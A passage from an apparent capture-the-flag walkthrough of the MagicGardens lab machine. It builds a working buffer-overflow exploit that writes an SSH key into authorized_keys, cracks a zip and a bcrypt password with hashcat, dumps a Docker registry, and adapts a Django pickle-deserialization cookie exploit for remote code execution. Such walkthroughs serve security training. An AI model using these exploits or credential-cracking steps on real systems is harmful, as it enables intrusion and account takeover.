          "--------------------------------------------------\nSource:\t[%s]\t[%hhu.%hhu.%hhu.%hhu]\ nDest:\t[%s]\t[%hhu.%hhu.%hhu.%hhu]\nTime:\t[%s]\tLength:\t[%hu]\n"
          ,param_4,(ulong)(uint)(int)*(char *)(param_1 + 0xc),
          (ulong)(uint)(int)*(char *)(param_1 + 0xd),(ulong)(uint)(int)*(char *)(param_1 + 0xe),
          (ulong)(uint)(int)*(char *)(param_1 + 0xf),param_5,
          (ulong)(uint)(int)*(char *)(param_1 + 0x10),(ulong)(uint)(int)*(char *)(param_1 + 0x11),
          (ulong)(uint)(int)*(char *)(param_1 + 0x12),(ulong)(uint)(int)*(char *)(param_1 + 0x13),
          param_6,(ulong)(uint)(int)*(char *)(param_7 + 2));
  return 0;
}

```

It outputs a string getting values from a bunch of fixed offsets into the packet.

The `log_packet` function called if it’s IPv6 is more interesting. It seems to assume any IPv6 traffic is suspicious and log the entire packet:

```

int log_packet(long ipv6_pkt,char *param_2)

{
  uint16_t packet_len_self;
  byte pkt_data [65360];
  char log_file_name [40];
  FILE *h_log_file;
  
  packet_len_self = htons(*(uint16_t *)(ipv6_pkt + 4));
  if (packet_len_self != 0) {
    strcpy(log_file_name,param_2);
    strncpy((char *)pkt_data,(char *)(ipv6_pkt + 0x3c),(ulong)packet_len_self);
    *(undefined2 *)(pkt_data + packet_len_self) = 10;
    h_log_file = fopen(log_file_name,"w");
    if (h_log_file == (FILE *)0x0) {
      puts("Bad log file");
    }
    else {
      fprintf(h_log_file,(char *)pkt_data);
      fclose(h_log_file);
      puts("[!] Suspicious activity. Packages have been logged.");
    }
  }
  return 0;
}

```

It starts by getting the packet’s self-reported length, four bytes into the IPv6 header. It then copies that many bytes from the end of the IPv6 header (0x3c) to a new buffer and saves that data to a file passed in as another argument.

#### Tangent - BOF in Server

There is a `strcpy` for `param2` into `log_file_name`, a 40 byte buffer. That seems very vulnerable to a buffer overflow. If I run the server with a longer filename, it starts up like normal:

```

oxdf@hacky$ sudo ./harvest server -l `python -c 'print("A"*100)'`
[*] Listening on interface ANY

```

Then when I connect with a client, all is good. But when I send any IPv6 packet to localhost, it crashes:

```

oxdf@hacky$ sudo ./harvest server -l `python -c 'print("A"*100)'`
[*] Listening on interface ANY
[*] Successful handshake
[!] Suspicious activity. Packages have been logged.
Segmentation fault

```

It does write to the log file with 100 As before it crashes. This isn’t useful to me because alex is already running the server with a reasonable log file name less than 40 characters.

### Exploit

#### Find BOF

I have a place where its using the packet’s length to determine how long to write in the buffer. But that’s not even the problem, as the buffer isn’t long enough to take a max length IPv6 data blob. IPv6 packets can support up to 65,535 bytes of data, but the buffer for the data is only 65,360 bytes.

To test this theory, I’ll create the start of a Python exploit:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
data = b"A" * (65535)
sock.sendto(data, SRV_ADDR)

```

This will send a full packet of “A” characters in an IPv6 packet. The port doesn’t matter because `harvest` is listening for raw packets.

I’ll start the server, and then connect the client to start logging. Then I’ll run the exploit. The server crashes:

```

oxdf@hacky$ sudo ./harvest server -i tun0 -l test.log
[*] Listening on interface tun0
[*] Successful handshake
[!] Suspicious activity. Packages have been logged.
Segmentation fault

```

There’s a new file in the same directory named with a bunch of “A”s:

```

oxdf@hacky$ file AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: ISO-8859 text, with very long lines (65406), with no line terminators

```

The file is full of a bunch of “A”s as well. So not only can I overflow and crash the server (which could lead to RCE almost certainly), I also see to have arbitrary file write, which will be much easier to exploit.

#### Get Filename Offset

When `harvest` reads a large IPv6 packet, it overflows the payload buffer and writes into the memory holding the log file name. I’d like to know the offset to that memory, so I can target a specific file. I know it’s at least 65,360, as that’s the size of the overflowed buffer. I’ll generate a pattern to check after that:

```

oxdf@hacky$ pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

```

I’ll update the script with that:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
data = b"A" * (65360)
data += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
sock.sendto(data, SRV_ADDR)

```

When I start the server and client again, and then run this, the server crashes again, creating this file from which I can measure the offset:

```

oxdf@hacky$ ls Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 
Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
oxdf@hacky$ pattern_offset -q Aa4A
[*] Exact match at offset 12

```

I’ll update the script to try to write to `overflow.log`:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
data = b"A" * (65360 + 12)
data += b"overflow.log"
sock.sendto(data, SRV_ADDR)

```

This time, the server doesn’t crash:

```

oxdf@hacky$ sudo ./harvest server -i tun0 -l test.log
[*] Listening on interface tun0
[*] Successful handshake
[!] Suspicious activity. Packages have been logged.
[!] Suspicious activity. Packages have been logged.
[!] Suspicious activity. Packages have been logged.
[!] Suspicious activity. Packages have been logged.

```

And `overflow.log` exists full of “A”:

```

oxdf@hacky$ wc overflow.log 
    0     1 65372 overflow.log
oxdf@hacky$ head -c 100 overflow.log 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

#### Write File

My goal is to write an SSH public key to alex’s `authorized_keys` file, providing SSH access. I don’t really want all those “A”, so I’ll replace them with “\n”. I’ll also add in some dummy data to represent what I want to write:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
file_path = b"overflow.log"
data = b"this will be my SSH public key"
data += b"\n" * (65360 + 12 - len(data))
data += file_path
sock.sendto(data, SRV_ADDR)

```

I’ll delete the existing `overflow.log` and run this. The resulting file is missing data from the top:

```

oxdf@hacky$ head -3 overflow.log 
 my SSH public key

```

It’s 12 bytes. I’ll put those at the front:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
file_path = b"overflow.log"
data = b"A" * 12
data += b"this will be my SSH public key"
data += b"\n" * (65360 + 12 - len(data))
data += file_path
sock.sendto(data, SRV_ADDR)

```

Now it writes the file exactly like I want.

#### Remote

At first, it seems like there might be two ways to do this:
- As the `socket` package is in the Python standard library, I could run this script on MagicGardens as is.
- I could get the IPv6 address for the host and run it from my host.

I couldn’t get the remote way to work. I think it has to do with the MTU of an ethernet frame across the wire being 1500 by default, which will make the packet too short to do the overflow.

I’ll update the script to write a file to `/dev/shm` with my SSH key:

```

import socket

SRV_ADDR = ("::1", 4444) # port doesn't matter
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
file_path = b"/dev/shm/key"
data = b"A" * 12
data += b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"
data += b"\n" * (65360 + 12 - len(data))
data += file_path
sock.sendto(data, SRV_ADDR)

```

And upload the script to MagicGardens and (after making sure there’s a client connected, which can be done from my host), run it:

```

morty@magicgardens:/dev/shm$ python3 sploit.py 
morty@magicgardens:/dev/shm$ head -3 key 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing

```

It worked! I’ll update the path from `/dev/shm/key` to `/home/alex/.ssh/authorized_keys`, and run it again. Now I’m able to connect over SSH as Alex:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen alex@magicgardens.htb
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
...[snip]...
You have mail.
...[snip]...
alex@magicgardens:~$

```

And grab `user.txt`:

```

alex@magicgardens:~$ cat user.txt
329d467c************************

```

## Shell as root in Container

### Enumeration

#### alex Home Dir

There’s not much of interest in alex’s home directory:

```

alex@magicgardens:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .harvest_logs  .local  .profile  .python_history  .reset.sh  .ssh  user.txt

```

`.reset.sh` is checking that the `harvert` server is running and restarting it if not:

```

#!/usr/bin/bash

res=$(ps aux | grep "harvest server" -m 1)

if [[ $res == *"grep"* ]]
then
        harvest server -l /home/alex/.harvest_logs &
fi

```

This is almost certainly running on a cron.

#### Mail

On connecting to SSH as alex, it said there was mail. There are two users with mailboxes in `/var/spool/mail`:

```

alex@magicgardens:/var/spool/mail$ ls
alex  root

```

alex can’t read root’s. There’s a single email in alex’s file:

```

From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023
Return-Path: <root@magicgardens.magicgardens.htb>
X-Original-To: alex@magicgardens.magicgardens.htb
Delivered-To: alex@magicgardens.magicgardens.htb
Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)
        id 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="1804289383-1695994309=:37178"
Subject: Auth file for docker
To: <alex@magicgardens.magicgardens.htb>
User-Agent: mail (GNU Mailutils 3.15)
Date: Fri, 29 Sep 2023 09:31:49 -0400
Message-Id: <20230929133149.3CDA93FC96@magicgardens.magicgardens.htb>
From: root <root@magicgardens.magicgardens.htb>
--1804289383-1695994309=:37178
Content-Type: text/plain; charset=UTF-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
Content-ID: <20230929093149.37178@magicgardens.magicgardens.htb>

Use this file for registry configuration. The password is on your desk
--1804289383-1695994309=:37178
Content-Type: application/octet-stream; name="auth.zip"
Content-Disposition: attachment; filename="auth.zip"
Content-Transfer-Encoding: base64
Content-ID: <20230929093149.37178.1@magicgardens.magicgardens.htb>

UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=
--1804289383-1695994309=:37178--

```

It’s from root to alex, and there’s an `auth.zip` attachment.

Email attachments are encoded with base64, which I’ll decode:

```

oxdf@hacky$ echo "UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=" | base64 -d > auth.zip
oxdf@hacky$ file auth.zip 
auth.zip: Zip archive data, at least v1.0 to extract, compression method=store

```

It contains an `htpasswd` file, and as mentioned in the email, it requires a password:

```

oxdf@hacky$ unzip -l auth.zip 
Archive:  auth.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       72  2024-05-16 14:03   htpasswd
---------                     -------
       72                     1 file
oxdf@hacky$ unzip auth.zip 
Archive:  auth.zip
[auth.zip] htpasswd password:

```

`zip2john` will generate a hash:

```

oxdf@hacky$ zip2john auth.zip > auth.zip.hash
ver 1.0 efh 5455 efh 7875 auth.zip/htpasswd PKZIP Encr: 2b chk, TS_chk, cmplen=84, decmplen=72, crc=B238A674 ts=A86E cs=a86e type=0

```

Which can be passed to `hashcat`:

```

$ hashcat auth.zip.hash rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 2 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  17225 | PKZIP (Mixed Multi-File)                                   | Archive
  17210 | PKZIP (Uncompressed)                                       | Archive

Please specify the hash-mode with -m [hash-mode].
...[snip]...
$ hashcat auth.zip.hash rockyou.txt --user -m 17225
hashcat (v6.2.6) starting
...[snip]...
$pkzip$1*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$:realmadrid
...[snip]...
$ hashcat auth.zip.hash --show --user -m 17225
auth.zip/htpasswd:$pkzip$1*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$:realmadrid

```

It works to unzip the archive:

```

oxdf@hacky$ unzip auth.zip 
Archive:  auth.zip
[auth.zip] htpasswd password: 
 extracting: htpasswd                
oxdf@hacky$ cat htpasswd 
AlexMiles:$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq

```

I’ll crack this as well:

```

$ hashcat htpasswd /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode  
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode]. 
...[snip]...
$ hashcat htpasswd /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds
...[snip]...
$ hashcat htpasswd --show --user -m 3200
AlexMiles:$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds

```

### Docker Registry

#### Enumeration

During initial enumeration, I was not able to access the Docker Registry without auth. Adding these creds works and returns the expected `{}` at `/v2/`:

```

oxdf@hacky$ curl -k https://magicgardens.htb:5000/v2/
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
oxdf@hacky$ curl -k https://magicgardens.htb:5000/v2/ -u AlexMiles:diamonds
{}

```

It has a single repository:

```

oxdf@hacky$ curl -k https://magicgardens.htb:5000/v2/_catalog -u AlexMiles:diamonds
{"repositories":["magicgardens.htb"]}

```

There’s one tag for that image:

```

oxdf@hacky$ curl -k https://magicgardens.htb:5000/v2/magicgardens.htb/tags/list -u AlexMiles:diamonds
{"name":"magicgardens.htb","tags":["1.3"]}

```

#### Get Container

From here, I can continue to enumerate and collect blobs using `curl`, but that is very manual and not interesting. I could also set up the TLS certificate authorities to download the image with `docker` itself (as I showed in [RegistryTwo](/2024/02/03/htb-registrytwo.html#get-image---via-docker)). I’ll use [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) to download the layers of the image:

```

oxdf@hacky$ python /opt/DockerRegistryGrabber/drg.py https://magicgardens.htb --dump magicgardens.htb -U AlexMiles -P diamonds
[+] BlobSum found 32
[+] Dumping magicgardens.htb
    [+] Downloading : d3a3443a740ae9a727dbd8868b751b492da27507f3cbbe0965982e65c436b8c0
    [+] Downloading : 2ed799371a1863449219ad8510767e894da4c1364f94701e7a26cc983aaf4ca6
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c
    [+] Downloading : 748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc
    [+] Downloading : 81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515
    [+] Downloading : 35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8
    [+] Downloading : 437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1
    [+] Downloading : f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82
    [+] Downloading : d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6
    [+] Downloading : fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea
    [+] Downloading : 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb
    [+] Downloading : 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d
    [+] Downloading : 4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b
    [+] Downloading : 9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f
    [+] Downloading : d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570

```

#### File System

I’ll run a loop to extract all the layers:

```

oxdf@hacky$ ls -1 | while read fn; do tar -xf "${fn}"; done
oxdf@hacky$ ls | grep -v tar.gz
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

```

The result looks like a standard Linux file system. There’s a Python application in `usr/src/app`:

```

oxdf@hacky$ ls usr/src/app/
app  db.sqlite3  entrypoint.sh  manage.py  media  requirements.txt  static  store

```

It has the container entry script that starts Django and nginx:

```

#!/bin/bash
RUN_PORT="8001"

python manage.py migrate --no-input
gunicorn app.wsgi:application --bind "0.0.0.0:${RUN_PORT}" --daemon

nginx -g 'daemon off;'

```

There is a `.env` file that holds the application secret:

```

oxdf@hacky$ cat usr/src/app/.env 
DEBUG=False
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b

```

The `settings.py` file shows that it’s using the [no longer supported](https://github.com/django/django/pull/15139) `PickleSerializer`:

```

SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

```

### Django Serialization Exploit

#### Strategy

With the Django secret, I can craft a cookie that will validate and be deserialized by the application. I’ve shown this attack before in [Developer](/2022/01/15/htb-developer.html#exploit) over three years ago. The attack is based on [this post](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/) from SCRT Team Blog about getting RCE on Facebook.

The post is from 2018, and targets a legacy Python (v2) server. In Developer, I had to get Python2 installed there because that’s what the target used. Here, it’s almost certainly Python3.

The post does include a POC script, which I’ll get to work with a few updates.

#### Setup Environment

Because it’s using the Pickle serializer, there’s an attack to get RCE. I’ll need to have Django installed on my machine to do this attack. I’ll start by creating a Python virtual environment and installing Django:

```

oxdf@hacky$ python -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$ pip install Django
Collecting Django
  Downloading Django-5.1.5-py3-none-any.whl.metadata (4.2 kB)
Collecting asgiref<4,>=3.8.1 (from Django)
  Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)
Collecting sqlparse>=0.3.1 (from Django)
  Downloading sqlparse-0.5.3-py3-none-any.whl.metadata (3.9 kB)
Downloading Django-5.1.5-py3-none-any.whl (8.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 8.3/8.3 MB 43.9 MB/s eta 0:00:00
Downloading asgiref-3.8.1-py3-none-any.whl (23 kB)
Downloading sqlparse-0.5.3-py3-none-any.whl (44 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 44.4/44.4 kB 3.2 MB/s eta 0:00:00
Installing collected packages: sqlparse, asgiref, Django
Successfully installed Django-5.1.5 asgiref-3.8.1 sqlparse-0.5.3

```

This actually won’t work, because the `PickleSerializer` object has been [removed from Django](https://github.com/django/django/pull/15139) since 5.0:

```

(venv) oxdf@hacky$ python
Python 3.12.3 (main, Jan 17 2025, 18:03:48) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import django.contrib.sessions.serializers
>>> django.contrib.sessions.serializers.PickleSerializer
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: module 'django.contrib.sessions.serializers' has no attribute 'PickleSerializer'

```

I’ll remove Django and install an older version by cloning the repo and checking out the last version of 4.X:

```

(venv) oxdf@hacky$ pip uninstall Django
Found existing installation: Django 5.1.5
Uninstalling Django-5.1.5:
  Would remove:
    /home/oxdf/django/venv/bin/django-admin
    /home/oxdf/django/venv/lib/python3.12/site-packages/Django-5.1.5.dist-info/*
    /home/oxdf/django/venv/lib/python3.12/site-packages/django/*
Proceed (Y/n)? y
  Successfully uninstalled Django-5.1.5
(venv) oxdf@hacky$ git clone https://github.com/django/django.git
Cloning into 'django'...
remote: Enumerating objects: 537673, done.
remote: Counting objects: 100% (318/318), done.
remote: Compressing objects: 100% (219/219), done.
remote: Total 537673 (delta 215), reused 100 (delta 99), pack-reused 537355 (from 4)
Receiving objects: 100% (537673/537673), 259.44 MiB | 46.19 MiB/s, done.
Resolving deltas: 100% (386133/386133), done.
(venv) oxdf@hacky$ cd django/

(venv) oxdf@hacky$ git checkout 4.2.18
Note: switching to '4.2.18'.
...[snip]...
HEAD is now at a7b0e50ead [4.2.x] Bumped version for 4.2.18 release.
(venv) oxdf@hacky$ pip install .
Processing /home/oxdf/django/django
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Requirement already satisfied: asgiref<4,>=3.6.0 in /home/oxdf/django/venv/lib/python3.12/site-packages (from Django==4.2.18) (3.8.1)
Requirement already satisfied: sqlparse>=0.3.1 in /home/oxdf/django/venv/lib/python3.12/site-packages (from Django==4.2.18) (0.5.3)
Building wheels for collected packages: Django
  Building wheel for Django (pyproject.toml) ... done
  Created wheel for Django: filename=Django-4.2.18-py3-none-any.whl size=7993633 sha256=5a411103a18308c5b514ddb662bc3ad2d3913622e505f86651b6a528883d072e
  Stored in directory: /tmp/pip-ephem-wheel-cache-rpks872j/wheels/c5/4d/bb/4101e16615d28a0e8391646c6aa269acae218af5c90a31ef9f
Successfully built Django
Installing collected packages: Django
Successfully installed Django-4.2.18

```

Now that object exists:

```

(venv) oxdf@hacky$ python
Python 3.12.3 (main, Jan 17 2025, 18:03:48) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import django.contrib.sessions.serializers
>>> django.contrib.sessions.serializers.PickleSerializer
<class 'django.core.serializers.base.PickleSerializer'>

```

#### POC

The POC script in the [blog post](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/) mostly works. It loads an existing cookie, and attaches a serialized object that will execute a command when it is deserialized:

```

#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='[RETRIEVEDKEY]'
#Initial cookie I had on sentry when trying to reset a password
cookie='gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)

```

Then it dumps that cookie out as text. I’ll remove the unused `HttpResponse` and `cPickle` imports, and update the `print` statement to use (). I’ll add in the secret and a cookie stoken from morty:

```

import django.core.signing, django.contrib.sessions.serializers
import os

SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b'
cookie='.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tecu5:oPSudCgAnfUwcXeLzEYI0JyLYEiYp0zWMnetW6Tdjhs'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print(django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True))

```

Running this generates an error having to do with the Django session not being initiated:

```

(venv) oxdf@hacky$ python django_exploit.py 
Traceback (most recent call last):
  File "/media/sf_CTFs/hackthebox/magicgardens-10.10.11.9/django_exploit.py", line 6, in <module>
    newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/django/venv/lib/python3.12/site-packages/django/core/signing.py", line 170, in loads
    return TimestampSigner(
           ^^^^^^^^^^^^^^^^
  File "/home/oxdf/django/venv/lib/python3.12/site-packages/django/core/signing.py", line 197, in __init__
    else settings.SECRET_KEY_FALLBACKS
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/django/venv/lib/python3.12/site-packages/django/conf/__init__.py", line 102, in __getattr__
